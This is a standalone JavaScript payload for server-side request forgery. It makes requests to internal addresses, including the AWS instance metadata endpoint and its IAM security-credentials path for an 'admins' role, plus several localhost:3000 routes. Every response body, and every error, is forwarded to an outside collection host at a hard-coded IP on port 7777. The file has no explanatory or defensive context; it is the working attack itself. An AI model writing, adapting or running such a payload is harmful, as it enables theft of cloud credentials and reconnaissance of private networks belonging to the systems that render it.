
function handler() {
  console.log(1);
  console.log(this);
  if(this.status == 200 && this.responseText != null) {
      console.log("sending");
      //xhr2.onreadystatechange = none; 
      var xhr2 = new XMLHttpRequest();
      xhr2.open("GET", 'http://192.241.169.35:7777/SSRF?MARKMARK=1&u='+encodeURIComponent(this.responseText), true);
      xhr2.send();

  } else {
    // something went wrong
    var xhr2 = new XMLHttpRequest();
    xhr2.open("GET", 'http://192.241.169.35:7777/SSRF?MARKMARK=1&error='+encodeURIComponent(this), true);
    xhr2.send();
  }
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = handler;

var urls = ["http://immunityinc.com","http://169.254.169.254/latest/dynamic/instance-identity/document","http://169.254.169.254/latest/meta-data/iam/security-credentials/admins","http://localhost:3000","http://localhost:3000/1/catalogs","http://ifconfig.pro","http://192.241.169.35:7777/SSRF"];
var arrayLength = urls.length;
for (var i = 0; i < arrayLength; i++) {
   try{
    xhr.open("GET", urls[i], true);
    xhr.send();
 } catch(err) { console.log(err); }
}



 
